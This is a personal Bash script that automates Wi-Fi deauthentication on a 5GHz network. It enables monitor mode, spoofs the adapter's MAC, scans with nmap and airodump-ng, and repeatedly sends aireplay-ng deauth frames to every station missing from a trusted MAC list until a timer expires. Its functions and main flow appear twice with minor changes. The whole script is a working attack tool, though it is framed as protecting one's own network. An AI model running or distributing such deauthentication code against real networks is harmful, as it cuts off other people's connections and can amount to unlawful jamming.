#!/bin/bash
#Creator: David Parra-Sandoval
#created: 10/21/2020
#Last modified: 11/06/2020
clear
cd /home/david/Templates/Bash-Scripts/bouncer/5GHz
if [[ ${UID} -ne 0 ]]; then
exit 1
fi

 monitorON () {
 			validate () {
MACS=$(wc -l 5ghzstations-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 5 ))
cat 5ghzstations-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate
sleep 1
for trust in $(cat validate); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate $maclistrust | grep "<" > realattack
echo "< HWaddress" >> realattack
sleep 2
if [[ $(cat realattack | awk '{print $2}') = HWaddress ]] && [[ $(cat realattack | cut -d " " -f 2) = HWaddress ]]; then
echo -e "\e[92mGREAT!!\e[00m no Unknown MAC addresses"
echo "Nothing to do..All is good!"
read -p "Press Enter to reset Network adapters to revert back to normal"
case $REPLY in
""|" ") sudo airmon-ng stop $wlan0 && sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up && rm  attack realattack validate;clear; exit 1;;
*) sudo airmon-ng stop $wlan0 && sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up && rm  attack realattack validate;clear; exit 1;;
esac
fi
}

	enforcer5GHz () {
    for mac in $(cat realattack); do
if [[ $mac = "HWaddress" ]]; then
echo ""
elif [[ $mac = "<" ]]; then
echo ""
else
sudo xterm -e aireplay-ng -D --deauth 40  -a $MYBSSID -c $mac $mon0 &
fi
done
 }

 if [[ -f $(find MAC/ -type f) ]]; then
	echo ""
	else
		echo -e "\e[91mNo MAC list! EXITING!!\e[00m"
		sleep 6
	exit 1
fi
mon0=$(ip a | grep wl | cut -d ":" -f2)
MYBSSID=$(cat mybssid)
CH=$(cat mychannel)
#echo "Xterm will launch to input your AP/router info"
#read -p "PRESS ENTER"
#exec xterm -e sudo airodump-ng --band a $mon0 &
#sleep 1
#clear
#PID1=$(ps -e | grep airodump-ng | cut -d " " -f 3)
#until [[ $INFO = [yY]* ]]; do
#read -p "Whats your BSSID: " MYBSSID
#echo
#read -p "Whats your CH: " CH
#echo
#read -p "Is this correct?: [y/n] " INFO
#clear
#done
#killall airodump-ng  ##PID1
clear
echo "Select the MAC Address list to filter"
echo "out the unknown MACs."
echo
select list in $(find MAC/ -type f); do
maclistrust=$list
cat $maclistrust
echo
read -p "Use the above mac list:? [y/n] " YESNO
case $YESNO in
y|Y) break ;;
n|N) echo "re-select:" ;;
*) echo "Only y,Y,n,N:re-select:" ;;
esac
done
clear
exec xterm -e sudo airodump-ng --band a -c $CH $mon0 &
sleep .5
PID2=$(ps -e | grep airodump-ng | cut -d " " -f 3)
killall airodump-ng ##PID2
#echo "Third this script will gather the necessary network info"
#echo "to populate the ARP table using nmap and ip neighbour."
#read -p  "PRESS ENTER"
if [[ $(ip a | grep dynamic | awk '{print $4}') = "192.168.1.255" ]]; then
SUBNET=192.168.1.1
else
SUBNET=192.168.0.1
fi
nmap -F $SUBNET/24
echo
ip neighbour
echo
echo "Airodump-ng will launch to capture asssociated 5GHz"
echo "MACs on your network, to be validated for deauthentication"
echo "Your AP/router: $MYBSSID channel: $CH "
echo 
echo -e "\e[91mAirodump-ng will now close after starting the timer! to better populate\e[00m"
echo -e "\e[91mthe unknown MAC Addresses/STATIONS!\e[00m"
read -p "PRESS ENTER"
exec xterm -e airodump-ng  -c $CH --bssid $MYBSSID --output-format csv -w 5ghzstations $mon0 &
sleep 1
PID3=$(ps -e | grep airodump-ng | cut -d " " -f 3)
echo
echo "Note! If you're deauthenticating your network"
echo "for only minutes, common sense would suggest that?"
echo "executing enforcer5GHz for longer than the actual" 
echo "timer/deauthentication duration."
echo
echo "Will not work!!"
read -p "PRESS ENTER"
clear
until [[ $INFO2 = [yY]* ]]; do
echo "Deauthenticate your WiFi network for:?"
echo
read -p "[H]ours or [M]inutes?: "
echo
case $REPLY in
h|H) read -p "How many Hours: " HOUR
echo
echo "The enforcer5GHz function executes to disconnect the unknown MACs!"
echo
read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
s|S) read -p "How many Seconds: "
START=$REPLY ;;
*) echo "Not valid use m,M,h,H" ;;
esac
HOURS=$(( 60 * $HOUR * 60 ))
TIME=$HOURS
echo
echo "Your 5GHz WiFi network will disconnect unknown"
echo "MACs every $START seconds for $TIME seconds!"
;;

m|M) read -p "How many Minutes: " min
echo
echo "The enforcer5GHz function executes to disconnect the unknown MACs!"
echo
read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
s|S) read -p "How many Seconds: "
START=$REPLY ;;
*) echo "Not valid use m,M,h,H" ;;
esac
MINUTES=$(( 60 * $min ))
TIME=$MINUTES
echo
echo "Your 5GHz WiFi network will disconnect unknown"
echo "MACs every $START seconds for $TIME seconds!"
;;

*) echo "Not valid use m,M,h,H"
;;
esac
echo
read -p "Is this correct?: [y/n] " INFO2
done
echo
read -p "PRESS ENTER: To Validate and Start Timer!"
clear
killall airodump-ng ##PID3
validate
echo -e "\e[91m"
cat realattack
echo -e "\e[00m"
echo
sleep 1
sed -i "s/time/$TIME/" timer.sh
sleep 1
sudo xterm -e ./timer.sh &
sleep .5
while true; do
for mac in $(cat realattack); do
if [[ $mac = "HWaddress" ]]; then
echo ""
elif [[ $mac = "<" ]]; then
echo ""
elif [[ $mac = " " ]]; then
echo ""
else
echo -e "\e[91m$mac\e[00m < MAC not trusted!" 
echo -e "enforcer5GHz function will execute every $START seconds!" 
echo -e "This attack on your 5GHz network will prolong"
echo -e "till timer counts down to 0!"
sed -i "s/$TIME/time/" timer.sh 
enforcer5GHz
sleep $START
fi
done
done
}


###########################################################################################################################################
###########################################################################################################################################
###########################################################################################################################################






for app in nmap xterm macchanger aircrack-ng ; do
command -v $app 2>&1> /dev/null
if [[ $? = 0 ]]; then
echo -e "\e[92mGreat!\e[00m $app installed"
else echo -e "\e[91m$app\e[00m not installed :("
echo "Script will not work without $app!!"
echo "Or will not work correctly!!"
fi
done

	validate () {
MACS=$(wc -l 5ghzstations-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 5 ))
cat 5ghzstations-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate
sleep 1
for trust in $(cat validate); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate $maclistrust | grep "<" > realattack
echo "< HWaddress" >> realattack
sleep 2
if [[ $(cat realattack | awk '{print $2}') = HWaddress ]] && [[ $(cat realattack | cut -d " " -f 2) = HWaddress ]]; then
echo -e "\e[92mGREAT!!\e[00m no Unknown MAC addresses"
echo "Nothing to do..All is good!"
read -p "Press Enter to reset Network adapters to revert back to normal"
case $REPLY in
""|" ") sudo airmon-ng stop $wlan0 && sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up && rm  attack realattack validate;clear; exit 1;;
*) sudo airmon-ng stop $wlan0 && sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up && rm  attack realattack validate;clear; exit 1;;
esac
fi
}

	enforcer5GHz () {
    for mac in $(cat realattack); do
if [[ $mac = "HWaddress" ]]; then
echo ""
elif [[ $mac = "<" ]]; then
echo ""
else
sudo xterm -e aireplay-ng -D --deauth 40  -a $MYBSSID -c $mac $mon0 &
fi
done
 }

 	MYINFO () {
 echo "Xterm will launch to input your AP/router info"
read -p "PRESS ENTER"
exec xterm -e sudo airodump-ng --band a $mon0 &
sleep 1
clear
PID1=$(ps -e | grep airodump-ng | cut -d " " -f 3)
until [[ $INFO = [yY]* ]]; do
read -p "Whats your BSSID: " MYBSSID
echo $MYBSSID > mybssid
read -p "Whats your CH: " CH
echo $CH > mychannel
read -p "Is this correct?: [y/n] " INFO
clear
done
killall airodump-ng  ##PID1
}
 
 if [[ -f $(find MAC/ -type f) ]]; then
	echo ""
	else
		echo -e "\e[91mNo MAC list! EXITING!!\e[00m"
		sleep 6
	exit 1
fi

if [[ -n $(ls /sys/class/net/ | grep mon) ]]; then 
	monitorON
fi


echo
echo "This script will deauthenticate unknown MACs in your 5GHz WiFi network"
echo "Using a timer that will run for [M]inutes or [H]ours!"
echo
echo "First lets select your wireless adapter to enable monitor mode."
echo "To gather the info about your 5GHz AP/router:"
echo
echo "enp=Ethernet wl=wireless lo=Loopback"
echo
select wifi in $(ls /sys/class/net); do
mon=$wifi
read -p "Use $wifi:? [y/n] "
case $REPLY in
y|Y) break;;
n|N) echo re-select:;;
*) echo "Only y,Y,n,N:re-select:";;
esac
done
sudo airmon-ng start $mon
mon0=$(ip a | grep wl | cut -d ":" -f2)
sudo ip link set $mon0 down
sudo macchanger -A $mon0 
sudo ip link set $mon0 up
clear
if [[ ! -f mybssid ]]; then
MYINFO
fi
clear
echo "Second select the MAC Address list to filter"
echo "out the unknown MACs."
echo
select list in $(find MAC/ -type f); do
maclistrust=$list
cat $maclistrust
echo
read -p "Use the above mac list:? [y/n] " YESNO
case $YESNO in
y|Y) break ;;
n|N) echo "re-select:" ;;
*) echo "Only y,Y,n,N:re-select:" ;;
esac
done
CH=$(cat mychannel)
MYBSSID=$(cat mybssid)
clear
exec xterm -e sudo airodump-ng --band a -c $CH $mon0 &
sleep .5
PID2=$(ps -e | grep airodump-ng | cut -d " " -f 3)
killall airodump-ng ##PID2
echo "Third this script will gather the necessary network info"
echo "to populate the ARP table using nmap and ip neighbour."
read -p  "PRESS ENTER"
if [[ $(ip a | grep dynamic | awk '{print $4}') = "192.168.1.255" ]]; then
SUBNET=192.168.1.1
else
SUBNET=192.168.0.1
fi
nmap -F $SUBNET/24
echo
ip neighbour
echo
echo "Next airodump-ng will launch to capture asssociated 5GHz"
echo "MACs on your network, to be validated for deauthentication"
echo "Based on the info provided of your AP/router: $MYBSSID channel: $CH "
echo "airodump-ng will close automatically after info is gathered."
read -p "PRESS ENTER"
exec xterm -e airodump-ng  -c $CH --bssid $MYBSSID --output-format csv -w 5ghzstations $mon0 &
sleep 1
PID3=$(ps -e | grep airodump-ng | cut -d " " -f 3)
echo
echo "Note! If you're deauthenticating your network"
echo "for only minutes, common sense would suggest that?"
echo "executing enforcer5GHz for longer than the actual" 
echo "timer/deauthentication duration."
sleep 10
echo
echo "Will not work!!"
sleep 3
read -p "PRESS ENTER"
clear
until [[ $INFO2 = [yY]* ]]; do
echo "Deauthenticate your WiFi network for:?"
echo
read -p "[H]ours or [M]inutes?: "
echo
case $REPLY in
h|H) read -p "How many Hours: " HOUR
echo
echo "The enforcer5GHz function executes to disconnect the unknown MACs!"
echo
read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
s|S) read -p "How many Seconds: "
START=$REPLY ;;
*) echo "Not valid use m,M,h,H" ;;
esac
HOURS=$(( 60 * $HOUR * 60 ))
TIME=$HOURS
echo
echo "Your 5GHz WiFi network will disconnect unknown"
echo "MACs every $START seconds for $TIME seconds!"
;;

m|M) read -p "How many Minutes: " min
echo
echo "The enforcer5GHz function executes to disconnect the unknown MACs!"
echo
read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
s|S) read -p "How many Seconds: "
START=$REPLY ;;
*) echo "Not valid use m,M,h,H" ;;
esac
MINUTES=$(( 60 * $min ))
TIME=$MINUTES
echo
echo "Your 5GHz WiFi network will disconnect unknown"
echo "MACs every $START seconds for $TIME seconds!"
;;

*) echo "Not valid use m,M,h,H"
;;
esac
echo
read -p "Is this correct?: [y/n] " INFO2
done
killall airodump-ng ##PID3
sleep 1
echo
validate
echo -e "\e[91m"
cat realattack
echo -e "\e[00m"
echo
read -p "PRESS ENTER: To Start Timer!"
clear
sed -i "s/time/$TIME/" timer.sh
sleep 1
sudo xterm -e ./timer.sh &
sleep .5
while true; do
for mac in $(cat realattack); do
if [[ $mac = "HWaddress" ]]; then
echo ""
elif [[ $mac = "<" ]]; then
echo ""
elif [[ $mac = " " ]]; then
echo ""
else
echo -e "\e[91m$mac\e[00m < MAC not trusted!" 
echo -e "enforcer5GHz function will execute every $START seconds!" 
echo -e "This attack on your 5GHz network will prolong"
echo -e "till timer counts down to 0!"
sed -i "s/$TIME/time/" timer.sh 
enforcer5GHz
sleep $START
fi
done
done
